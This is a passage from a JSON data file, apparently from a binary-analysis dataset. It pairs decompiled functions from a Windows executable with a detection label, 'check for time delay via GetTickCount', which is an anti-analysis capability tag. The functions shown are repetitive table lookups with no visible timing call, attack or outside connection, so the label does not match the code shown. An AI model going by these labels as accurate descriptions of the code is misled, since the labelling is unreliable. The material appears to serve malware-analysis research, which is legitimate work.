*(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3542
    },
    "1400b985": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9850(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(*0x14010ff40);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113280, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113320, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113340, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113360, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113380, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113550, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113590, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401135b0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113640, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113660, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113680, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar2;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3389
    },
    "1400b98b": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b98b0(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(*0x1401100e0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113320, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113340, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113360, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113380, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133c0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133e0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113400, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113450, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113490, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134d0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134f0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113510, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089f0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113550, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a00);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113590, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a10);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401135b0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a20);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113640, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a30);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113660, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a40);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113680, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108a50);\n    iVar4 = *piVar3;\n    piVar3 = *(iVar4 + 8);\n    if ((uVar1 < *(iVar4 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        iVar4 = 0x140112140;\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401136a0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    if (iVar4 != 0) {\n        arg3 = sub.msvcrt.dll_strlen(iVar4);\n        fcn.1400b67b0(piVar3, iVar4, arg3);\n        return piVar3;\n    }\n    iVar4 = *(*piVar3 + -0x18) + piVar3;\n    fcn.1400b4ab0(iVar4, *(iVar4 + 0x20) | 1);\n    return piVar3;\n}\n",
        "token_count": 3238
    },
    "1400b991": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint64_t * fcn.1400b9910(int64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int64_t *piVar2;\n    int64_t *piVar3;\n    ulong arg3;\n    int64_t iVar4;\n    \n    uVar1 = fcn.14002c080(*0x1401100f0);\n    piVar3 = *(*arg1 + 8);\n    if ((uVar1 < *(*arg1 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113340, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108920);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113360, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108930);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113380, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108940);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133a0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108950);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401133c0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108960);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401133e0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x140108970);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113400, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089a0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113450, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089b0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x140113490, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089c0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x1401134d0, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089d0);\n    piVar3 = *(*piVar2 + 8);\n    if ((uVar1 < *(*piVar2 + 0x10)) && (piVar3 = piVar3[uVar1],  piVar3 != NULL)) {\n        piVar2 = fcn.1400bce00(piVar3, 0x140112140, 0x1401134f0, 0);\n        if (piVar2 != NULL) {\n            return piVar2;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    uVar1 = fcn.14002c080(0x1401089e0);\n    piVar2 = *(*piVar3 + 8);\n    if ((uVar1 < *(*piVar3 + 0x10)) && (piVar2 = piVar2[uVar1],  piVar2 != NULL)) {\n        piVar3 = fcn.1400bce00(piVar2, 0x140112140, 0x140113510, 0);\n        if (piVar3 != NULL) {\n            return piVar3;\n        }\n    }\n    else {\n        fcn.1400bd1f0();\n    }\n    fcn.1400bd7d0();\n    